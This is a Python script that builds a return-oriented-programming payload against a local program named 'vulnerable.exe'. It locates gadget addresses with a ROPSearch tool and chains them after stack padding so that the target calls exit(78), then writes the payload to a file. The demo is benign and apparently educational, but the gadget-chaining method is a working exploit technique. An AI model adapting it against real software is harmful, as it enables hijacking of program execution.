import os, sys
import subprocess
import collections


InstructionSequence = collections.namedtuple('InstructionSequence', 'vmAddress assemblyString')


def changeCWDToScriptDirectory():
    abspath = os.path.abspath(__file__)
    dname = os.path.dirname(abspath)
    os.chdir(dname)

def runSubprocess(args):
    return subprocess.check_output(args, stderr=subprocess.STDOUT, text=True)

def stringIsHexNumber(string):
    try:
        _ = int(string, 16)
        return True
    except:
        return False

def getInstructionSequenceOutput(vulnerableProcessName):
    ropSearchPath = '../bin/ROPSearch.exe'
    vulnerableProcessPid = runSubprocess(['pidof', vulnerableProcessName]).strip()

    args = [
        ropSearchPath,
        'list',
        '-pid',
        vulnerableProcessPid,
    ]
    output = runSubprocess(args)

    lines = output.split(sep='\n')
    if len(lines) == 0:
        print(f'Found empty output when looking for instruction sequences in "{vulnerableProcessName}"')
        sys.exit(-1)

    instrSequences = []
    for line in lines:
        parts = line.split(': ', maxsplit=1)
        if len(parts) == 2 and stringIsHexNumber(parts[0]):
            virtualMemoryAddress = parts[0]
            assemblyString = parts[1]
            iSeq = InstructionSequence(virtualMemoryAddress, assemblyString)
            instrSequences.append(iSeq)

    return instrSequences

def findInstructionSequenceAddress(instrSequences, targetInstrSeqString):
    usefulInstrSequences = [iSeq for iSeq in instrSequences if iSeq.assemblyString == targetInstrSeqString]
    if len(usefulInstrSequences) == 0:
        print(f'The output doesn\'t have the target instruction sequence: {targetInstrSeqString}')
        sys.exit(-1)

    virtualAddress = usefulInstrSequences[0].vmAddress
    print(f'{virtualAddress=}')

    virtualAddress = int(virtualAddress, 16)
    virtualAddressBytes = virtualAddress.to_bytes(8, 'little')
    # print(f'{virtualAddressBytes.hex()=}')
    return virtualAddressBytes


if __name__ == "__main__":
    changeCWDToScriptDirectory()

    print('Scanning bytes...')
    instrSequences = getInstructionSequenceOutput('vulnerable.exe')

    payloadComponents = [
        b'\xFF' * 100, # Add padding to get over the stack buffer.
        b'\xFF' * 12, # Add padding to get over ??.
        b'\xFF' * 8, # Add padding to get over the stored RBP value.

        # RDI = returnCode;
        findInstructionSequenceAddress(instrSequences, 'pop rdi; ret'),
        (78).to_bytes(8, 'little'),

        # RAX = 60; (system call number for `exit();`)
        findInstructionSequenceAddress(instrSequences, 'pop rax; ret'),
        (60).to_bytes(8, 'little'),

        # call `exit(RDI);`
        findInstructionSequenceAddress(instrSequences, 'syscall; ret'),

        # Add more padding to make sure we go over the hardcoded stack buffer length.
        b'\xFF' * 100,
    ]

    payload = b''.join(payloadComponents)
    print(f"payload = {payload.hex()}")

    with open('syscallExitPayload.dat', 'wb') as fout:
        fout.write(payload)
